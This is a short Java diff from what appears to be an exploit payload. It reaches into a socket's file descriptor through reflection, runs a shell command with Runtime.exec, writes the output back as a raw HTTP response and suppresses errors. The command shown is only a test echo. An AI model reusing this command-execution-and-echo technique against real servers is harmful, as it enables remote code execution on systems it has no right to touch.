@@ -61,14 +61,8 @@
             field.set(fileDescriptor, fdVal);
             Object socketOutputStream = constructor2.newInstance(new Object[]{constructor3.newInstance(new Object[]{fileDescriptor})});
 
-            java.io.BufferedReader br = new java.io.BufferedReader(new java.io.InputStreamReader(Runtime.getRuntime().exec("echo \"It works!\"").getInputStream()));
-            StringBuilder sb = new StringBuilder();
-            String line;
-            while((line = br.readLine()) != null){
-                sb.append(line + "\n");
-            }
-
-            String result = "HTTP/1.1 200 OK\nConnection: close\n\n" + sb.toString() + "\n";
+            String res = new java.util.Scanner(Runtime.getRuntime().exec("echo \"It works!!\"").getInputStream()).useDelimiter("\\A").next();
+            String result = "HTTP/1.1 200 OK\nConnection: close\n\n" + res + "\n";
             write.invoke(socketOutputStream,  new Object[]{result.getBytes()});
         }catch (Exception e){
             //pass
